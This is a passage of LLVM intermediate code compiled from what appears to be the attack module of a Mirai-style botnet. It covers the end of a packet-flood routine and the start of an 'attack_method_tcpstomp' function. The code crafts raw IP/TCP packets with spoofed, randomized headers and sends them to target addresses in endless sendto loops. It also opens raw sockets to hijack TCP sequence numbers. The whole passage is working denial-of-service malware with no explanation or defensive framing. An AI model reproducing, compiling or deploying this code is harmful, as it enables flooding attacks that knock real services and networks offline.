  %168 = icmp ne i8 %167, 0
  br i1 %168, label %169, label %173

169:                                              ; preds = %122
  %170 = call zeroext i16 @htons(i16 noundef zeroext 16384) #9
  %171 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 4
  store i16 %170, i16* %172, align 2
  br label %173

173:                                              ; preds = %169, %122
  %174 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 6
  store i8 6, i8* %175, align 1
  %176 = load i32, i32* %28, align 4
  %177 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 8
  store i32 %176, i32* %178, align 4
  %179 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %180 = load i32, i32* %9, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i64 %181
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i32 0, i32 1
  %184 = load i32, i32* %183, align 4
  %185 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 9
  store i32 %184, i32* %186, align 4
  %187 = load i16, i16* %16, align 2
  %188 = call zeroext i16 @htons(i16 noundef zeroext %187) #9
  %189 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 0
  store i16 %188, i16* %190, align 4
  %191 = load i16, i16* %17, align 2
  %192 = call zeroext i16 @htons(i16 noundef zeroext %191) #9
  %193 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %194 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %193, i32 0, i32 1
  store i16 %192, i16* %194, align 2
  %195 = load i32, i32* %18, align 4
  %196 = trunc i32 %195 to i16
  %197 = call zeroext i16 @htons(i16 noundef zeroext %196) #9
  %198 = zext i16 %197 to i32
  %199 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 2
  store i32 %198, i32* %200, align 4
  %201 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %202 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %201, i32 0, i32 4
  %203 = load i16, i16* %202, align 4
  %204 = and i16 %203, -241
  %205 = or i16 %204, 80
  store i16 %205, i16* %202, align 4
  %206 = load i8, i8* %20, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 13
  %213 = and i16 %210, -8193
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %21, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 12
  %222 = and i16 %219, -4097
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %22, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 11
  %231 = and i16 %228, -2049
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %23, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 10
  %240 = and i16 %237, -1025
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %24, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 9
  %249 = and i16 %246, -513
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8, i8* %25, align 1
  %252 = sext i8 %251 to i16
  %253 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 4
  %255 = load i16, i16* %254, align 4
  %256 = and i16 %252, 1
  %257 = shl i16 %256, 8
  %258 = and i16 %255, -257
  %259 = or i16 %258, %257
  store i16 %259, i16* %254, align 4
  %260 = call i32 @rand_next()
  %261 = and i32 %260, 65535
  %262 = trunc i32 %261 to i16
  %263 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %264 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %263, i32 0, i32 5
  store i16 %262, i16* %264, align 2
  %265 = load i8, i8* %22, align 1
  %266 = icmp ne i8 %265, 0
  br i1 %266, label %267, label %273

267:                                              ; preds = %173
  %268 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %270, -2049
  %272 = or i16 %271, 2048
  store i16 %272, i16* %269, align 4
  br label %273

273:                                              ; preds = %267, %173
  %274 = load i8*, i8** %31, align 8
  %275 = load i32, i32* %26, align 4
  call void @rand_str(i8* noundef %274, i32 noundef %275)
  br label %276

276:                                              ; preds = %273
  %277 = load i32, i32* %9, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %9, align 4
  br label %117, !llvm.loop !19

279:                                              ; preds = %117
  br label %280

280:                                              ; preds = %438, %279
  store i32 0, i32* %9, align 4
  br label %281

281:                                              ; preds = %435, %280
  %282 = load i32, i32* %9, align 4
  %283 = load i8, i8* %5, align 1
  %284 = zext i8 %283 to i32
  %285 = icmp slt i32 %282, %284
  br i1 %285, label %286, label %438

286:                                              ; preds = %281
  %287 = load i8**, i8*** %11, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds i8*, i8** %287, i64 %289
  %291 = load i8*, i8** %290, align 8
  store i8* %291, i8** %32, align 8
  %292 = load i8*, i8** %32, align 8
  %293 = bitcast i8* %292 to %struct.iphdr*
  store %struct.iphdr* %293, %struct.iphdr** %33, align 8
  %294 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i64 1
  %296 = bitcast %struct.iphdr* %295 to %struct.tcphdr*
  store %struct.tcphdr* %296, %struct.tcphdr** %34, align 8
  %297 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i64 1
  %299 = bitcast %struct.tcphdr* %298 to i8*
  store i8* %299, i8** %35, align 8
  %300 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %301 = load i32, i32* %9, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %303, i32 0, i32 2
  %305 = load i8, i8* %304, align 4
  %306 = zext i8 %305 to i32
  %307 = icmp slt i32 %306, 32
  br i1 %307, label %308, label %329

308:                                              ; preds = %286
  %309 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %310 = load i32, i32* %9, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %309, i64 %311
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i32 0, i32 1
  %314 = load i32, i32* %313, align 4
  %315 = call i32 @ntohl(i32 noundef %314) #9
  %316 = call i32 @rand_next()
  %317 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 2
  %322 = load i8, i8* %321, align 4
  %323 = zext i8 %322 to i32
  %324 = lshr i32 %316, %323
  %325 = add i32 %315, %324
  %326 = call i32 @htonl(i32 noundef %325) #9
  %327 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 9
  store i32 %326, i32* %328, align 4
  br label %329

329:                                              ; preds = %308, %286
  %330 = load i32, i32* %28, align 4
  %331 = icmp eq i32 %330, -1
  br i1 %331, label %332, label %336

332:                                              ; preds = %329
  %333 = call i32 @rand_next()
  %334 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %335 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %334, i32 0, i32 8
  store i32 %333, i32* %335, align 4
  br label %336

336:                                              ; preds = %332, %329
  %337 = load i16, i16* %13, align 2
  %338 = zext i16 %337 to i32
  %339 = icmp eq i32 %338, 65535
  br i1 %339, label %340, label %346

340:                                              ; preds = %336
  %341 = call i32 @rand_next()
  %342 = and i32 %341, 65535
  %343 = trunc i32 %342 to i16
  %344 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 3
  store i16 %343, i16* %345, align 4
  br label %346

346:                                              ; preds = %340, %336
  %347 = load i16, i16* %16, align 2
  %348 = zext i16 %347 to i32
  %349 = icmp eq i32 %348, 65535
  br i1 %349, label %350, label %356

350:                                              ; preds = %346
  %351 = call i32 @rand_next()
  %352 = and i32 %351, 65535
  %353 = trunc i32 %352 to i16
  %354 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 0
  store i16 %353, i16* %355, align 4
  br label %356

356:                                              ; preds = %350, %346
  %357 = load i16, i16* %17, align 2
  %358 = zext i16 %357 to i32
  %359 = icmp eq i32 %358, 65535
  br i1 %359, label %360, label %366

360:                                              ; preds = %356
  %361 = call i32 @rand_next()
  %362 = and i32 %361, 65535
  %363 = trunc i32 %362 to i16
  %364 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 1
  store i16 %363, i16* %365, align 2
  br label %366

366:                                              ; preds = %360, %356
  %367 = load i32, i32* %18, align 4
  %368 = icmp eq i32 %367, 65535
  br i1 %368, label %369, label %373

369:                                              ; preds = %366
  %370 = call i32 @rand_next()
  %371 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 2
  store i32 %370, i32* %372, align 4
  br label %373

373:                                              ; preds = %369, %366
  %374 = load i32, i32* %19, align 4
  %375 = icmp eq i32 %374, 65535
  br i1 %375, label %376, label %380

376:                                              ; preds = %373
  %377 = call i32 @rand_next()
  %378 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 3
  store i32 %377, i32* %379, align 4
  br label %380

380:                                              ; preds = %376, %373
  %381 = load i8, i8* %27, align 1
  %382 = icmp ne i8 %381, 0
  br i1 %382, label %383, label %386

383:                                              ; preds = %380
  %384 = load i8*, i8** %35, align 8
  %385 = load i32, i32* %26, align 4
  call void @rand_str(i8* noundef %384, i32 noundef %385)
  br label %386

386:                                              ; preds = %383, %380
  %387 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 7
  store i16 0, i16* %388, align 2
  %389 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %390 = bitcast %struct.iphdr* %389 to i16*
  %391 = call zeroext i16 @checksum_generic(i16* noundef %390, i32 noundef 20)
  %392 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 7
  store i16 %391, i16* %393, align 2
  %394 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 6
  store i16 0, i16* %395, align 4
  %396 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %397 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %398 = bitcast %struct.tcphdr* %397 to i8*
  %399 = load i32, i32* %26, align 4
  %400 = sext i32 %399 to i64
  %401 = add i64 20, %400
  %402 = trunc i64 %401 to i16
  %403 = call zeroext i16 @htons(i16 noundef zeroext %402) #9
  %404 = load i32, i32* %26, align 4
  %405 = sext i32 %404 to i64
  %406 = add i64 20, %405
  %407 = trunc i64 %406 to i32
  %408 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %396, i8* noundef %398, i16 noundef zeroext %403, i32 noundef %407)
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 %408, i16* %410, align 4
  %411 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 1
  %413 = load i16, i16* %412, align 2
  %414 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %415 = load i32, i32* %9, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 0
  %419 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %418, i32 0, i32 1
  store i16 %413, i16* %419, align 2
  %420 = load i32, i32* %10, align 4
  %421 = load i8*, i8** %32, align 8
  %422 = load i32, i32* %26, align 4
  %423 = sext i32 %422 to i64
  %424 = add i64 40, %423
  %425 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %426 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %427 = load i32, i32* %9, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i64 %428
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i32 0, i32 0
  %431 = bitcast %struct.sockaddr_in* %430 to %struct.sockaddr*
  store %struct.sockaddr* %431, %struct.sockaddr** %425, align 8
  %432 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %433 = load %struct.sockaddr*, %struct.sockaddr** %432, align 8
  %434 = call i64 @sendto(i32 noundef %420, i8* noundef %421, i64 noundef %424, i32 noundef 16384, %struct.sockaddr* %433, i32 noundef 16)
  br label %435

435:                                              ; preds = %386
  %436 = load i32, i32* %9, align 4
  %437 = add nsw i32 %436, 1
  store i32 %437, i32* %9, align 4
  br label %281, !llvm.loop !20

438:                                              ; preds = %281
  br label %280

439:                                              ; preds = %113, %107
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpstomp(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_xmas_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 16) #8
  %47 = bitcast i8* %46 to %struct.attack_xmas_data*
  store %struct.attack_xmas_data* %47, %struct.attack_xmas_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 noundef %49, i64 noundef 8) #8
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 2, i32 noundef 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 3, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 4, i32 noundef 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 5, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 11, i32 noundef 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 12, i32 noundef 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 13, i32 noundef 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 14, i32 noundef 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 15, i32 noundef 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 16, i32 noundef 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 noundef zeroext %96, %struct.attack_option* noundef %97, i8 noundef zeroext 0, i32 noundef 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 noundef zeroext %99, %struct.attack_option* noundef %100, i8 noundef zeroext 1, i32 noundef 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #8
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %4
  br label %606

106:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 noundef %107, i32 noundef 0, i32 noundef 3, i8* noundef %108, i32 noundef 4) #8
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 noundef %112)
  br label %606

114:                                              ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

115:                                              ; preds = %491, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %494

120:                                              ; preds = %115
  br label %121

121:                                              ; preds = %486, %475, %120
  %122 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #8
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %121
  br label %491

125:                                              ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 noundef %127, i32 noundef 3, i32 noundef 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 noundef %126, i32 noundef 4, i32 noundef %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

140:                                              ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 noundef %146) #9
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 noundef %157) #9
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

161:                                              ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

170:                                              ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

174:                                              ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

179:                                              ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #9
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

183:                                              ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 noundef %184, %struct.sockaddr* %188, i32 noundef 16)
  %190 = call i64 @time(i64* noundef null) #8
  store i64 %190, i64* %31, align 8
  br label %191

191:                                              ; preds = %489, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 noundef %192, i8* noundef %193, i64 noundef 256, i32 noundef 16384, %struct.sockaddr* %197, i32* noundef %29)
  %199 = trunc i64 %198 to i32
  store i32 %199, i32* %33, align 4
  %200 = load i32, i32* %33, align 4
  %201 = icmp eq i32 %200, -1
  br i1 %201, label %202, label %203

202:                                              ; preds = %191
  br label %606

203:                                              ; preds = %191
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %205 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 4
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 4
  %210 = icmp eq i32 %206, %209
  br i1 %210, label %211, label %481

211:                                              ; preds = %203
  %212 = load i32, i32* %33, align 4
  %213 = sext i32 %212 to i64
  %214 = icmp ugt i64 %213, 40
  br i1 %214, label %215, label %481

215:                                              ; preds = %211
  %216 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %217 = getelementptr inbounds i8, i8* %216, i64 20
  %218 = bitcast i8* %217 to %struct.tcphdr*
  store %struct.tcphdr* %218, %struct.tcphdr** %35, align 8
  %219 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %220 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %219, i32 0, i32 0
  %221 = load i16, i16* %220, align 4
  %222 = zext i16 %221 to i32
